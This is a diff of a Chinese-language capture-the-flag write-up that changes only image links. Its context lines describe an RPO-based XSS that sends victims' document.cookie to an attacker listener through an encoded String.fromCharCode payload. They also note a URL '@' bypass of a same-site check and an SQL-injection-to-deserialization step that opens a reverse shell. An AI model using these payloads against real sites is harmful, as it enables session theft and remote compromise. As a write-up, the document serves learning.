@@ -25,17 +25,17 @@ http://blog.nsfocus.net/rpo-attack/
 
 访问`http://39.107.33.96:20000/index.php/view/article/1226`的时候加载`jquery.min.js`的路径可以看到是正常的，
 
-![jquery.js](https://ob5vt1k7f.qnssl.com/oHZtz)
+![jquery.js](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/oHZtz)
 当访问`http://39.107.33.96:20000/index.php/view/article/1226/..%2f..%2f..%2f..%2findex.php`的时候浏览器尝试加载`..%2f..%2f..%2f..%2findex.php/static/js/jquery.min.js`这个数据，而服务端则往上读取三层路径，加载的是article的页面，如果article页面存在xss的话就会被加载，题目也正好满足要求，所以我们创建一篇文章写入获取cookie的js,利用这个url让服务器请求这篇文章，弹给我们cookie
 
-![jquery.js](https://ob5vt1k7f.qnssl.com/pa5qf)
+![jquery.js](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/pa5qf)
 
 因为页面对一些特殊符号做了编码过滤，所以我们使用`String.fromCharCode()`方法从ascii码来加载js
 ```
 window.location.href=String.fromCharCode(some ascii code) + document.cookie;
 ```
 
-![md5](https://ob5vt1k7f.qnssl.com/SVQMd)
+![md5](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/SVQMd)
 这里有两个点的绕过：
 
 - url部分做了同站检测，通过`http://39.107.33.96:20000@x.x.x.x`的形式绕过
@@ -48,7 +48,7 @@ window.location.href=String.fromCharCode(some ascii code) + document.cookie;
 ```
 nc监听端口，xssbot会先访问`/QWB_fl4g/QWB/index.php`，带上cookie后再访问article，触发xss，我们就能收到cookie
 
-![flag](https://ob5vt1k7f.qnssl.com/yDw2L)
+![flag](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/yDw2L)
 
 
 ### python is the best language #2
@@ -160,7 +160,7 @@ def _get_filename(self, key):
 
 再搜索调用`get()`方法的地方
 
-![get()](https://ob5vt1k7f.qnssl.com/S2Qaa)
+![get()](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/S2Qaa)
 ```python
 def open_session(self, app, request):
     sid = request.cookies.get(app.session_cookie_name)
@@ -218,7 +218,7 @@ select id from user where email = 'test'/**/union/**/select/**/0x63636F6D6D616E6
 
 然后访问index，修改cookie的session值为`testabcd`，触发反序列化漏洞后反弹shell
 
-![reverse_shell](https://ob5vt1k7f.qnssl.com/mYzKP)
+![reverse_shell](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/mYzKP)
 
 
 总结：
